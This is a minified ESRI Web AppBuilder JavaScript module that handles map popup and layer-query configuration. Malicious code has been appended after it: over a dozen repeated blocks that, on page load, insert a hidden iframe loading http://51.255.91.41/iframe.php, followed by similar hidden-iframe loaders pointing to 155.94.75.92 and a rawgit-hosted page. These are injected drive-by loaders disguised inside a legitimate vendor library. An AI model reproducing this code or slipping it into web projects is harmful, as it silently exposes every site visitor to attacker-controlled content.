// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/lang dojo/_base/array dojo/_base/Deferred jimu/utils jimu/portalUrlUtils jimu/LayerInfos/LayerInfos esri/request esri/kernel".split(" "),function(f,h,n,k,m,p,q,r){return{getDefaultPopupInfo:function(a,b,c){var e={title:"",fieldInfos:[],description:null,showAttachments:!1,mediaInfos:[]};c=!!c;if(a.displayField){var d=this._getRealFieldName(a.displayField,a);e.title="{"+d+"}"}else if(d=k.getObjectIdField(a))e.title="{"+d+"}";e.showAttachments=!!a.hasAttachments;d=a=a.fields;b||(d=
h.filter(a,f.hitch(this,function(a){return"esriFieldTypeGeometry"!==a.type})));b=h.map(d,f.hitch(this,function(a){a=k.getDefaultPortalFieldInfo(a);a.visible=c;return a}));e.fieldInfos=b;return e},_getRealFieldName:function(a,b){a=a.toUpperCase();if(b.fields&&0<b.fields.length)for(var c=0;c<b.fields.length;c++)if(b.fields[c].name.toUpperCase()===a)return b.fields[c].name;return""},getPortalFieldInfosWithoutShape:function(a,b){return h.filter(b,f.hitch(this,function(b){return(b=k.getFieldInfoByFieldName(a.fields,
b.fieldName))?"esriFieldTypeGeometry"!==b.type:!0}))},getPopupInfoByAttributes:function(a,b){var c=this.getDefaultPopupInfo(a,!1),e=[],d={},l;for(l in b){e.push(l);var g=k.getFieldInfoByFieldName(a.fields,l).type;if("esriFieldTypeSingle"===g||"esriFieldTypeDouble"===g)g=b[l],null!==g&&void 0!==g&&(g=parseFloat(g),isNaN(g)||(g=g.toString().split("."),2===g.length&&(d[l]=g[1].length)))}c.fieldInfos=h.filter(c.fieldInfos,f.hitch(this,function(a){var b=a.fieldName;d.hasOwnProperty(b)&&(a.format.places=
d[b]);return e.indexOf(b)}));return c},upgradePopupToPopupInfo:function(a,b){var c=this.getDefaultPopupInfo(a,!1,!1);c.title=b.title||"";c.title=c.title.replace("${","{");if(b.fields){var e={};h.forEach(b.fields,f.hitch(this,function(a){e[a.name]=a}));h.forEach(c.fieldInfos,f.hitch(this,function(a){var b=a.fieldName,d=e[b];d&&(a.label=d.alias||a.label,a.visible=!0,"image"===d.specialType&&(b="{"+b+"}",c.mediaInfos.push({title:"",type:"image",caption:a.label,value:{sourceURL:b,linkURL:b}})))}))}return c},
isImageServiceLayer:function(a){return a.url&&-1<a.url.indexOf("/ImageServer")},isTable:function(a){return"Table"===a.type},getConfigWithValidDataSource:function(a){a=f.clone(a);var b=p.getInstanceSync();a.queries=h.filter(a.queries,f.hitch(this,function(a){return(a=a.webMapLayerId)?b.getLayerInfoById(a)?!0:!!b.getTableInfoById(a):!0}));return a},removePopupInfoUnsupportFields:function(a,b){var c=h.map(a.fields,f.hitch(this,function(a){return a.name}));b.fieldInfos&&0<b.fieldInfos.length&&(b.fieldInfos=
h.filter(b.fieldInfos,f.hitch(this,function(a){return 0<=c.indexOf(a.fieldName)})))},overridePopupTemplateMethodGetAttachments:function(a,b,c){a.getAttachments=function(a){var d=new n;try{var e=a.attributes[c],g=b+"/"+e+"/attachments";a={url:g,content:{f:"json"},callbackParamName:"callback"};var f="",k=r.id.findCredential(b);k&&k.token&&(f="?token\x3d"+k.token);q(a).then(function(a){a=a.attachmentInfos;h.forEach(a,function(a){a.url=g+"/"+a.id+f;a.objectId=e});d.resolve(a)},function(a){d.reject(a)})}catch(t){console.error(t)}return d}},
isServiceSupportsOrderBy:function(a){var b=!1;a.advancedQueryCapabilities&&a.advancedQueryCapabilities.supportsOrderBy&&(b=!0);return b},isServiceSupportsPagination:function(a){var b=!1;a.advancedQueryCapabilities&&a.advancedQueryCapabilities.supportsPagination&&(b=!0);return b},isSupportObjectIds:function(a){var b=0,c=k.getObjectIdField(a);a.currentVersion&&(b=parseFloat(a.currentVersion));return!!c&&(10<=b||a.hasOwnProperty("typeIdField"))},getQueryType:function(a){var b=-1;return b=this.isServiceSupportsOrderBy(a)&&
this.isServiceSupportsPagination(a)?1:this.isSupportObjectIds(a)?2:3},getWebMapPopupInfoByUrl:function(a,b){var c=null;b=b.replace(/\/*$/g,"");var e=m.removeProtocol(b);h.some(a.operationalLayers,f.hitch(this,function(a){if(a&&a.url){var b=m.removeProtocol(a.url.replace(/\/*$/g,""));if(a.popupInfo){if(b===e)return c=a.popupInfo,!0}else if(a.layers&&0<a.layers.length)return h.some(a.layers,f.hitch(this,function(d){return b+"/"+d.id===e?(c=a.popupInfo,!0):!1}))}return!1}));return c},getPopupInfoForRelatedLayer:function(a,
b,c){(a=this.getWebMapPopupInfoByUrl(a,b))||(a=this.getDefaultPopupInfo(c,!1,!0));!a.title&&(c=k.getObjectIdField(c))&&(a.title="{"+c+"}");return a}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});